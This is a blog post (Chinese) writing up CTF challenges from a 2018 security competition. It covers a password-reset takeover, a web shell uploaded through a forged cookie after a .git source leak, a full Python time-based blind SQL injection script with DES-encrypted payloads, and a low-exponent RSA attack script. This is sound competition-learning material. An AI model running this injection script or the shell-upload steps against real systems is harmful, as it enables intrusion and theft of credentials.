
<!DOCTYPE html>
<html lang="zh-Hans">
    <head>
        <title>网络空间安全技术大赛</title>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=2.0">
<link rel="stylesheet", href="/./css/style.css">
<link rel="shortcut icon", href="/../../../../images/favicon.ico">
<link rel="apple-touch-icon", href="/./apple-touch-icon.png">

        
    
    <link rel='stylesheet' href="/./css/dracula.css">

    </head>
    <body>
        <header class="al_header al_pos_fixed">
    <div class="al_header_container dis_flex_jcenter">
        <div class="al_header_container_left">
            <div class="al_header_site_title">
                <a href="/">Altm4nz's blog</a>
            </div>
        </div>

        <div class="dis_flex_jcenter">
            <div class="al_header_setting">
                <svg class="al_header_icon">
                    <use xmlns="http://www.w3.org/2000/svg" xlink:href="/assets/svg_icons.svg#svg-menu"></use>
                </svg>
            </div>
        </div>
    </div>
</header>

        <div class="al_sidebar">

    <div class="al_sidebar_overlay al_full_cover"></div>

    <div class="al_pos_fixed al_sidebar_cnt">
        <div class="dis_flex_acenter al_sidebar_header">
            <h3>Altm4nz's blog</h3>
            <div class="al_sidebar_close al_header_setting">
                <svg class="al_header_icon">
                    <use xmlns="http://www.w3.org/2000/svg" xlink:href="/assets/svg_icons.svg#svg-close"></use>
                </svg>
            </div>
        </div>

        <div class="al_sidebar_author_cnt">

            <div class="al_sidebar_author_info">
                
                <img class="al_sidebar_avatar" src="../../../../images/IMG_4178.JPG">
                <p></p>
                <h4>WEB划水选手</h4>
            </div>

            
        </div>
    </div>
</div>

        
    <div class="dis_flex_center al_lightbox_cnt al_full_cover">
        <img class="al_lightbox_img"/>
    </div>
    <div class="al_page_background dis_flex_center al_full_cover"></div>
    <div class="al_page_container">
        <div class="al_pos_ab al_fake_background"></div>
        <div class="al_main_container al_shadow al_main_page_container">
            <article class="al_article">
                <header>
                    <h1 class="al_page_title">
                        网络空间安全技术大赛
                    </h1>
                    <div class="al_page_info dis_flex">
                        <div class="al_page_content_info">
                            May 13, 2018 10:05 AM
                        </div>

                        
                            <div class="al_page_content_info">
                                549 words
                            </div>
                        

                        
                            <div class="al_page_content_info">
                                2 minutes read
                            </div>
                            <div class="al_page_content_info">
                                本文总阅读量<span id="busuanzi_value_page_pv"></span>次
                            </div>
                        
                        <span class="tags"></span>
                    </div>
                </header>

                
                    <div class="al_page_content_outline">
                        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web1"><span class="toc-text">web1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web2"><span class="toc-text">web2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web3"><span class="toc-text">web3</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#misc"><span class="toc-text">misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#misc3"><span class="toc-text">misc3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RSA2"><span class="toc-text">RSA2</span></a></li></ol></li></ol>
                    </div>
                

                
                <section id="post-body">
                    <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><a id="more"></a>
<h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>任意注册登录后，发现改密码的功能，<br>存在漏洞，抓包修改后改修改admin密码。<br>登陆admin账户，发现img目录可读，<br>在<br><a href="http://117.34.117.216/img/img726849685.jpg" target="_blank" rel="noopener">http://117.34.117.216/img/img726849685.jpg</a><br>发现是flag</p>
<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>.git泄露源码，利用githack恢复。<br>index.php被加密，查看upload.php<br>构造cookie上传shell</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">in_adminid=<span class="number">1</span>，in_adminname=admin,in_adminpassword=<span class="number">1</span>,in_permission=<span class="number">2</span>,in_adminexpire=<span class="number">00e81</span>e7d738c221945959d19c56cb33d</span><br></pre></td></tr></table></figure>
<p>利用菜刀连接，找到fl4g.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PM9SCREW	†&gt;&lt;Þî<span class="number">6</span>o=‘®vD&amp;©Ú?“LéXhpUòüM­ãÌósÂãL33CýRí¬¢½S2rœ&lt;’<span class="number">2</span>óxÒ<span class="number">7</span>oä].º</span><br></pre></td></tr></table></figure>
<p>也被加密 找到SCREW解密工具<a href="https://github.com/firebroo/screw_decode.git" target="_blank" rel="noopener">https://github.com/firebroo/screw_decode.git</a><br>解密后得到flag{7cb3d823105433606ccac8fb75aed67c}</p>
<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>跳转到QQ空间，抓包看一到一个url<br>访问拿到一个JS文件，解混淆后审计，找到关键代码</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">	url:<span class="string">'/f701fee85540b78d08cb276d14953d58'</span>,</span><br><span class="line">	type:<span class="string">'POST'</span>,</span><br><span class="line">	dataType:<span class="string">'json'</span>,</span><br><span class="line">	data: <span class="string">"data="</span>+<span class="built_in">encodeURIComponent</span>(encryptByDES($(<span class="string">'#loginform'</span>).serialize(),key)),</span><br><span class="line">	error:<span class="function"><span class="keyword">function</span>(<span class="params">er</span>)</span>&#123;</span><br><span class="line">	    <span class="built_in">window</span>.location.href=<span class="string">'https://qzone.qq.com'</span>; </span><br><span class="line">             &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>在ip，hrUW3PG7mp3RLd3dJu，LxMzAX2jog9Bpjs07jP可能存在注入。<br>首先模拟JS上的加密，JS上使用的是一个标准的DES的ECB模式加密，在python中利用pyDes库重现加密过程<br>然后进行时间盲注。<br>脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pyDes </span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">url=<span class="string">'http://45.76.49.10:8001/f701fee85540b78d08cb276d14953d58'</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">des_ecb_encode</span><span class="params">(source, key)</span>:</span></span><br><span class="line">    des_obj = pyDes.des(key.encode(<span class="string">'utf-8'</span>), pyDes.ECB, IV=<span class="literal">None</span>, pad=<span class="literal">None</span>, padmode=pyDes.PAD_PKCS5)    </span><br><span class="line">    des_result = des_obj.encrypt(source)</span><br><span class="line">    <span class="keyword">return</span> (des_result)</span><br><span class="line"></span><br><span class="line">key=<span class="string">"MiaoMiao"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> (<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        <span class="comment">#message="ip=1.1.1.1&amp;hrUW3PG7mp3RLd3dJu=1',if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='admin'),%d,1))=%d),sleep(5),1))#&amp;LxMzAX2jog9Bpjs07jP="%(i,j)</span></span><br><span class="line">        <span class="comment">#message="ip=1.1.1.1&amp;hrUW3PG7mp3RLd3dJu=1',if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))=%d),sleep(5),1))#&amp;LxMzAX2jog9Bpjs07jP="%(i,j)</span></span><br><span class="line">        message=<span class="string">"ip=1.1.1.1&amp;hrUW3PG7mp3RLd3dJu=1',if((ascii(substr((select group_concat(password) from admin),%d,1))=%d),sleep(5),1))#&amp;LxMzAX2jog9Bpjs07jP="</span>%(i,j)</span><br><span class="line">        code = des_ecb_encode(message, key)</span><br><span class="line">        pay= (base64.b64encode(code))</span><br><span class="line">        data=&#123;</span><br><span class="line">        <span class="string">'data'</span>:(pay)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r=requests.post(url=url,data=data,timeout=<span class="number">4</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            flag+= chr(j)</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment">#admin,users</span></span><br><span class="line"><span class="comment">#username,password</span></span><br><span class="line"><span class="comment">#flag&#123;73ad1744f38b68ece51076c7ac77621b&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h2><p>发现ICMP中的流量相似，仔细观察后发现每个请求都有两个字母不同，<br>按时间线排序拼接后拿到flag{RyHgbCf5OhFEiyJnlt9c8ASP}</p>
<h2 id="RSA2"><a href="#RSA2" class="headerlink" title="RSA2"></a>RSA2</h2><p>e=3，典型低指数攻击。直接附上脚本</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import gmpy</span><br><span class="line"></span><br><span class="line"><span class="attribute">c</span>=80256065280425989347153660555632253204654757632704797390559450985825600409910703812294413750536361555897348650491697548574007864446117693097103136799284683292648287334023253488891301144881769557674366138889636475162525325855368132832237345279798028008137655682278413635753791609965810603989005785747744993045461207072415730041608172272077090225741385971</span><br><span class="line"></span><br><span class="line"><span class="attribute">n</span>=27262030738190162906068533309218248319312037416856794814532459866130196673561833084739048171769479893806671499522643803412108279907223895517897969906253626028270289028646596897429641138913001561947557784840311014399973312098056896539904624036584153785225626096007313018814076860235378686567457599895712604364100507424939342862464483596795761725357279364545154915110900098124905389351969357103586063992040096368146580315262263546850581515833590884397726108478477798668261762306189036525841356592859315437201733146083995028221597538824801113980100295046731791678895520928441645173205511865657977068061078456941189550383</span><br><span class="line"><span class="attribute">e</span>=3</span><br><span class="line"><span class="attribute">i</span>=0</span><br><span class="line"><span class="keyword">while</span> 1:</span><br><span class="line">	<span class="keyword">if</span> gmpy.root((c+i*n),e)[1]==1:</span><br><span class="line">		<span class="builtin-name">print</span> <span class="string">"success"</span></span><br><span class="line">		<span class="attribute">m</span>=gmpy.root((c+i*n),e)[0]</span><br><span class="line">		<span class="builtin-name">print</span> m</span><br><span class="line">		<span class="builtin-name">print</span> i</span><br><span class="line">		break		</span><br><span class="line">	<span class="attribute">i</span>=i+1</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">print</span> m</span><br></pre></td></tr></table></figure>
<p>然后16进制转文本得到 my password is: I_Lov5_RSA_Rel6te7_me8sagE_aTTacK</p>

                </section>

                
                
                


            
            <nav class="dis_flex al_post_nav">
                <a class="al_post_nav_item dis_flex_acenter" href="/2018/05/28/CSTS-AWD/">
                    
                        <svg class="al_arrow">
                            <use xmlns="http://www.w3.org/2000/svg" xlink:href="/assets/svg_icons.svg#svg-arrow-left"></use>
                        </svg>
                        <span class="al_text_ellipsis al_post_nav_desc">CSTS-AWD-XI'AN</span>
                    
                </a>
                <a class="al_post_nav_item dis_flex_acenter" href="/2018/05/10/QWB-python-wp/">
                    
                        <span class="al_text_ellipsis al_post_nav_desc">QWB_python_wp</span>
                        <svg class="al_arrow">
                            <use xmlns="http://www.w3.org/2000/svg" xlink:href="/assets/svg_icons.svg#svg-arrow-right"></use>
                        </svg>
                    
                </a>
            </nav>
        </div>
    </div>


        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<div class="al_index_footer dis_flex_center">



    
    

    <div class="al_index_footer_item al_index_footer_extra">
        Power By 
        <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>
    </div>

    <div class="al_index_footer_item al_index_footer_extra_right">
        All Right Reserved
    </div>
    <div class="al_index_footer_item al_index_footer_extra_right">
            本站总访问量<span id="busuanzi_value_site_pv"></span>次
    </div>
            
</div>

        <script type="text/javascript" async="async" src="/javascripts/acelog.js"></script>
        
        
        
    </body>
</html>
        